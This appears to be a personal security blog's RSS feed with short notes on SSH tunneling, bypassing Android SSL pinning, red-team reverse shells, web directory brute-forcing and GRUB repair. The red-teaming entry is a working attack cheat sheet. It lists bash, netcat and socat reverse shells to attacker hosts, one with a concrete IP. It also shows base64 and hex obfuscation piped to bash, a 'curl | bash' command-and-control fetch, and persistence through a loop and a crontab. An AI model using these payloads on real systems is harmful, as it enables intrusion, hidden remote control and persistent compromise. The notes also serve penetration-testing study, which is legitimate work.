<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Laladee</title><link>https://laladee.github.io/</link><description>Recent content on Laladee</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Thu, 27 May 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://laladee.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Tunneling and Port Forwarding</title><link>https://laladee.github.io/secnote/tunneling-and-port-forwarding/</link><pubDate>Thu, 27 May 2021 00:00:00 +0000</pubDate><guid>https://laladee.github.io/secnote/tunneling-and-port-forwarding/</guid><description>&lt;h2 id="ssh-tunnel">SSH Tunnel&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>config in &lt;code>/etc/ssh/sshd_config&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>N - do not execute a remote command&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="socket-tunnel-with-ssh">Socket tunnel with SSH&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ssh -ND &lt;span style="color:#ae81ff">8080&lt;/span> username@12.12.12.12
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now configure SOCKS proxy to 127.0.0.1 port 8080, all the traffic is now tunneled through 12.12.12.12 as a VPN.&lt;/p>
&lt;h3 id="port-forwarding-with-ssh">Port forwarding with SSH&lt;/h3>
&lt;p>&lt;strong>Local port forwarding:&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ssh -g -NL 1337:12.12.12.150:8000 username@12.12.12.12
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now connect to &lt;code>[::]/127.0.0.1&lt;/code> on port 1337 will get tunneled to 12.12.12.150:8000 via 12.12.12.12&lt;/p>
&lt;p>&lt;strong>Remote port forwarding:&lt;/strong> &lt;code>GatewayPorts yes&lt;/code>&lt;/p></description></item><item><title>Android Pentest</title><link>https://laladee.github.io/secnote/android-pentesting/</link><pubDate>Fri, 02 Apr 2021 00:00:00 +0000</pubDate><guid>https://laladee.github.io/secnote/android-pentesting/</guid><description>&lt;h2 id="bypass-ssl-pinning">Bypass SSL pinning&lt;/h2>
&lt;h3 id="install-burpsuites-certificate-to-system-store">Install Burpsuiteâ€™s certificate to system store&lt;/h3>
&lt;ol>
&lt;li>Export certificate with &lt;code>Certificate in DER format&lt;/code> option and named &lt;code>burp.der&lt;/code>&lt;/li>
&lt;li>Convert certificate to crt/pem format: &lt;code>openssl x509 -in burp.der -inform DER -out burp.crt&lt;/code>&lt;/li>
&lt;li>Rename to &lt;code>&amp;lt;hash&amp;gt;.0&lt;/code>, get hash: &lt;code>openssl x509 -inform PEM -subject_hash_old -in burp.crt | head -n 1&lt;/code>
rename: &lt;code>mv burp.crt 9a5ba575.0&lt;/code>&lt;/li>
&lt;li>Backup existing certs: &lt;code>adb shell &amp;quot;cp /system/etc/security/cacerts/* /tmp&amp;quot;&lt;/code>&lt;/li>
&lt;li>Create an in-memory mount: &lt;code>adb shell &amp;quot;mount -t tmpfs tmpfs /system/etc/security/cacerts&amp;quot;&lt;/code>&lt;/li>
&lt;li>Copy the existing certs back into the tmpfs mount: &lt;code>adb shell &amp;quot;mv /tmp/*.0 /system/etc/security/cacerts/&amp;quot;&lt;/code>&lt;/li>
&lt;li>Push &lt;code>burp.crt&lt;/code> into cacerts folder: &lt;code>adb push 9a5ba575.0 /system/etc/security/cacerts/&lt;/code>&lt;/li>
&lt;li>Update the perms, so everything is as readable as before.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>adb shell &lt;span style="color:#e6db74">&amp;#34;chown root:root /system/etc/security/cacerts/*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">chmod 644 /system/etc/security/cacerts/*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">chcon u:object_r:system_file:s0 /system/etc/security/cacerts/*&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>Auto.sh&lt;/strong>: export burp suite certificate and named &lt;code>burp.der&lt;/code>&lt;/p></description></item><item><title>Red Teaming</title><link>https://laladee.github.io/secnote/red-teaming/</link><pubDate>Mon, 18 Nov 2019 00:00:00 +0000</pubDate><guid>https://laladee.github.io/secnote/red-teaming/</guid><description>&lt;h2 id="reverse-shell">Reverse Shell&lt;/h2>
&lt;h3 id="reverse-shell-with-bash">Reverse shell with bash&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>bash -i &amp;gt;&amp;amp; /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In case shell causes the application to suspended, run in new session with &lt;code>setsid&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>setsid bash -i &amp;amp;&amp;gt;/dev/tcp/ATTACKER_IP/ATTACKER_PORT 0&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">1&lt;/span> &amp;amp;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>By &lt;code>msfvenom&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>bash -c &lt;span style="color:#e6db74">&amp;#39;0&amp;lt;&amp;amp;42-;exec 42&amp;lt;&amp;gt;/dev/tcp/10.110.28.5/4747;sh &amp;lt;&amp;amp;42 &amp;gt;&amp;amp;42 2&amp;gt;&amp;amp;42&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Tricks and obfuscate:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>echo COMMAND_BASE64 | base64 -d | bash
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo COMMAND_HEX | xxd -p -r | bash
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>echo,COMMAND_BASE64&lt;span style="color:#f92672">}&lt;/span>|&lt;span style="color:#f92672">{&lt;/span>base64,-d&lt;span style="color:#f92672">}&lt;/span>|bash
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bash -c &lt;span style="color:#f92672">{&lt;/span>echo,COMMAND_BASE64&lt;span style="color:#f92672">}&lt;/span>|&lt;span style="color:#f92672">{&lt;/span>base64,-d&lt;span style="color:#f92672">}&lt;/span>|&lt;span style="color:#f92672">{&lt;/span>bash,-i&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl http://ATTACKER_IP:PORT | bash &lt;span style="color:#75715e">#kind of a C&amp;amp;C&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="background-reverse-shell-with-loop-and-crontab">Background reverse shell with loop and crontab&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> :; &lt;span style="color:#66d9ef">do&lt;/span> REVERSE_SHELL_COMMAND; sleep 900; &lt;span style="color:#66d9ef">done&lt;/span> &amp;amp;&amp;gt;/dev/null &amp;amp;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#34;*/15 * * * * REVERSE_SHELL_COMMAND&amp;#34;&lt;/span> &amp;gt; .job; crontab .job
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="reverse-shell-with-netcat--socat">Reverse shell with netcat &amp;amp; socat&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nc -e /bin/bash -vn ATTACKER_IP ATTACKER_PORT
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>socat exec:&lt;span style="color:#e6db74">&amp;#39;bash -li&amp;#39;&lt;/span>,pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:ATTACKER_PORT
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Listener: &lt;code>socat file:&lt;/code>tty&lt;code>,raw,echo=0 tcp-listen:ATTACKER_PORT&lt;/code>&lt;/p></description></item><item><title>Enumeration</title><link>https://laladee.github.io/secnote/enumeration/</link><pubDate>Sun, 17 Nov 2019 00:00:00 +0000</pubDate><guid>https://laladee.github.io/secnote/enumeration/</guid><description>&lt;h2 id="subdomain-discovery">Subdomain Discovery&lt;/h2>
&lt;h3 id="subdomain-with-amass">Subdomain with amass&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>amass enum -active -d hackerone.com -max-depth &lt;span style="color:#ae81ff">3&lt;/span> -config amass.config.ini
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Example of config file &lt;a href="https://github.com/OWASP/Amass/blob/master/examples/config.ini">https://github.com/OWASP/Amass/blob/master/examples/config.ini&lt;/a>&lt;/p>
&lt;p>Others: &lt;a href="https://github.com/projectdiscovery/subfinder">subfinder&lt;/a>, &lt;a href="https://github.com/Edu4rdSHL/findomain/">findomain&lt;/a>, &lt;a href="https://github.com/tomnomnom/assetfinder">assetfinder&lt;/a>&lt;/p>
&lt;h3 id="subdomain--cidrs-by-organization">Subdomain &amp;amp; CIDRs by organization&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>spk -silent -s &lt;span style="color:#e6db74">&amp;#34;HackerOne&amp;#34;&lt;/span> | dnsx -silent -ptr -resp-only
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="directory-brute-force">Directory brute-force&lt;/h2>
&lt;p>Wordlist: assetnote, Fuzzing/fuzz-Bo0oM.txt, Web-Content/common.txt, Web-Content/raft-large-directories.txt&lt;/p>
&lt;h3 id="directory-brute-force-with-ffuf">Directory brute-force with ffuf&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ffuf -u http://118.70.116.235:8052/current_config/FUZZ -w ~/Downloads/assetnote/data/manual/raft-large-directories-lowercase.txt -ac -mc 200,204,301,307,400,401,403,405 -t &lt;span style="color:#ae81ff">10&lt;/span> -e .js,.conf
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="directory-brute-force-with-gobuster">Directory brute-force with gobuster&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://hackerone.com/backups/ -t &lt;span style="color:#ae81ff">20&lt;/span> -x zip,txt,log,db,json,js,conf --status-codes-blacklist
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="directory-brute-force-with-wfuzz">Directory brute-force with wfuzz&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -z list,php-txt-zip-log-db-json --hc 403,404 -t &lt;span style="color:#ae81ff">20&lt;/span> -u http://10.10.10.187/utility-scripts/FUZZ.FUZ2Z
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>--hc/hl/hw/hh&lt;/code>: Hide responses with the specified code/lines/words/chars&lt;/p></description></item><item><title>Operating System</title><link>https://laladee.github.io/secnote/operating-system/</link><pubDate>Sun, 31 Dec 2017 00:00:00 +0000</pubDate><guid>https://laladee.github.io/secnote/operating-system/</guid><description>&lt;h2 id="lost-grub-bootloader">Lost grub bootloader&lt;/h2>
&lt;p>Some reasons lead to lost grub:&lt;/p>
&lt;ul>
&lt;li>Upgrade BIOS&lt;/li>
&lt;li>Reinstall windows while using dual OS&lt;/li>
&lt;li>Grub not installed in Linux installation progress&lt;/li>
&lt;/ul>
&lt;h3 id="re-install-grub-bootloader">Re-install grub bootloader&lt;/h3>
&lt;p>Use &lt;a href="https://sourceforge.net/projects/boot-repair-cd/">boot-repair-disk&lt;/a> as a rescue tool if can&amp;rsquo;t boot into linux os, setup into the USB and boot it up&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>grub-install /dev/sda
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>update-grub
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Check the disk with &lt;code>fdisk -l&lt;/code> or &lt;code>blkid&lt;/code>&lt;/p>
&lt;h3 id="using-bootice-to-modify">Using BOOTICE to modify&lt;/h3>
&lt;p>UEFI uses &lt;code>efi&lt;/code> files in EFI partition to boot the OS, as Windows is &lt;code>bootmgfw.efi&lt;/code>, Kali Linux is &lt;code>grubx64.efi&lt;/code>,&amp;hellip; Now setup a boot entry on the top of order. Go to &lt;code>UEFI&lt;/code> tab &amp;gt; &lt;code>Edit boot entries&lt;/code>&lt;/p></description></item></channel></rss>